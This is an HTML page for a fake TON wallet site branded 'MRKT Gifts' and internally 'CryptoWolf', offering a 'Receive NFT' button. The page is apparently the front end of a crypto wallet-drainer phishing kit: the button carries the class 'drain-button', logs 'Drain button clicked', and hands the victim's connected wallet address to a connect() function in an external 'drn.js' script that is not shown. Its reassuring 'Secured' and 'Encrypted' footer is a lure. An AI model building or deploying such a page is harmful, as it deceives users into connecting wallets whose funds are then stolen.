<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoWolf</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 24px;
            padding: 40px 32px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
            max-width: 420px;
            width: 100%;
            text-align: center;
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: linear-gradient(135deg, #0088cc, #006699);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 25px rgba(0, 136, 204, 0.3);
        }
        
        .logo img {
            width: 40px;
            height: 40px;
        }
        
        .title {
            font-size: 28px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 12px;
        }
        
        .subtitle {
            font-size: 16px;
            color: #666;
            margin-bottom: 32px;
        }
        
        .connect-section {
            margin-bottom: 20px;
        }
        
        .info-message {
            background: rgba(0, 136, 204, 0.1);
            border: 1px solid rgba(0, 136, 204, 0.2);
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
            font-size: 15px;
            color: #0088cc;
            line-height: 1.4;
        }
        
        .drain-button {
            width: 100%;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            border: none;
            border-radius: 12px;
            height: 52px;
            font-weight: 600;
            color: white;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .drain-button:hover {
            background: linear-gradient(135deg, #ff7b7b, #ff6b35);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.3);
        }
        
        .footer {
            margin-top: 24px;
            font-size: 12px;
            color: #999;
        }

        .ton-connect-button {
            width: 100%;
        }

        /* –°–∫—Ä—ã—Ç—ã–π –±–ª–æ–∫ –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏ */
        .button-block {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ton.org/download/ton_symbol.png" alt="TON">
        </div>
        
        <h1 class="title">MRKT Gifts</h1>
        <p class="subtitle">TON Wallet Management Tool</p>
        
        <div class="connect-section">
            <div id="ton-connect" class="ton-connect-button"></div>
        </div>
        
        <div class="info-message">
            ‚ö° Connect your TON wallet and click receive button to proceed<br>
            Secure and fast transactions
        </div>
        
        <button onclick="window.didtrans()" class="drain-button">
            üöÄ Receive NFT
        </button>
        
        <div class="footer">
            Secured by TON Blockchain ‚Ä¢ Encrypted Connection
        </div>
    </div>

    <!-- –°–∫—Ä—ã—Ç—ã–π –±–ª–æ–∫ –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏ -->
    <div class="button-block">
        <button id="ton-connect-hidden">TEST</button>
    </div>

    <script>
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
        window.didtrans = function() {
            console.log('Drain button clicked');
            
            if (window.tonConnectUI && window.tonConnectUI.connected) {
                const walletAddress = window.tonConnectUI.account.address;
                console.log('Wallet connected, address:', walletAddress);
                
                if (typeof window.connect === 'function') {
                    console.log('Calling connect function with address:', walletAddress);
                    window.connect(walletAddress);
                } else {
                    console.error('connect function not found');
                    alert('Error: connect function not found in drn.js');
                }
            } else {
                console.log('No wallet connected');
                alert('Please connect your wallet first!');
            }
        }

        // –§—É–Ω–∫—Ü–∏—è connectWallet –¥–ª—è –æ–±—Ä–∞—Ç–Ω–æ–π —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏
        window.connectWallet = function() {
            console.log('connectWallet called');
            if (window.tonConnectUI) {
                if (!window.tonConnectUI.connected) {
                    window.tonConnectUI.openModal();
                } else {
                    window.tonConnectUI.disconnect();
                }
            }
        }

        console.log('CryptoWolf initialized');
    </script>

    <!-- –ü–æ–¥–∫–ª—é—á–∞–µ–º drn.js -->
    <script src="drn.js"></script>
</body>
</html>
